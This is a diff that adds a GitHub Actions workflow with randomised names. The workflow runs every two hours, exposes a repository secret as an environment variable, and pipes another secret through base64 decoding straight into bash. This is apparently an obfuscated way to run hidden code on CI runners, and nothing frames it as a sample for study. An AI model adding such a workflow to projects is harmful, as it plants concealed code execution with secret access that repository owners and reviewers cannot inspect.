@@ -1,0 +1,13 @@
+name: nRpIYg
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  zRxzNvg:
+    runs-on: ubuntu-latest
+    env:
+      pwhDvqlAv: ${{ secrets.LyoAXCfklFbg }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.CSMPvc }}" | base64 -d | bash
